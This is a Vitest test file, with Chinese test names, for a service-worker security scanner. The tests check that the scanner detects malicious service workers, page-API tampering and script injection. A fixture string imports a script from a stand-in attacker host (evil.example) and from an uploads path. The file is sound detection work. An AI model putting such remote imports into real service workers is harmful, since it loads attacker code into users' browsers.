import { describe, it, expect } from 'vitest';
import { resolve } from 'node:path';
import { scanServiceWorkerFile, checkImportScripts, STATIC_RULES } from '../../src/audit/static-scanner.js';

const publicDir = resolve(import.meta.dirname, '../../public');

describe('静态规则引擎', () => {
  it('恶意 SW 与注入载荷命中多条 error 规则（API 篡改 / HTML 注入）', async () => {
    const swFindings = (await scanServiceWorkerFile(resolve(publicDir, 'sw/evil-sw.js'))).findings;
    const payloadFindings = (await scanServiceWorkerFile(resolve(publicDir, 'evil-payload.js'))).findings;
    const ids = [...swFindings, ...payloadFindings].map((f) => f.id);
    expect(ids).toContain('sw-page-api-tamper'); // 注入载荷改写页面 SW 管理 API
    expect(ids).toContain('sw-inline-injection'); // 恶意 SW 向导航 HTML 注入脚本标签
    expect([...swFindings, ...payloadFindings].some((f) => f.severity === 'error')).toBe(true);
  });

  it('合法 SW 不命中 error 规则', async () => {
    const { findings } = await scanServiceWorkerFile(resolve(publicDir, 'sw.js'));
    expect(findings.filter((f) => f.severity === 'error')).toEqual([]);
  });

  it('importScripts 跨源/非白名单地址被拦截', () => {
    const source = `
      importScripts('https://evil.example/payload.js');
      importScripts('/sw/imports/legit.js');
      importScripts('/uploads/sneaky.js');
    `;
    const findings = checkImportScripts(source, ['/sw/imports/']);
    expect(findings.some((f) => f.id === 'import-cross-origin')).toBe(true);
    expect(findings.some((f) => f.id === 'import-not-allowlisted')).toBe(true);
    // 白名单内的不报
    expect(findings.some((f) => f.target === '/sw/imports/legit.js')).toBe(false);
  });

  it('规则集合本身具备关键防线规则', () => {
    const ids = STATIC_RULES.map((r) => r.id);
    for (const required of ['sw-eval', 'sw-remote-import', 'sw-page-api-tamper', 'sw-inline-injection']) {
      expect(ids).toContain(required);
    }
  });
});
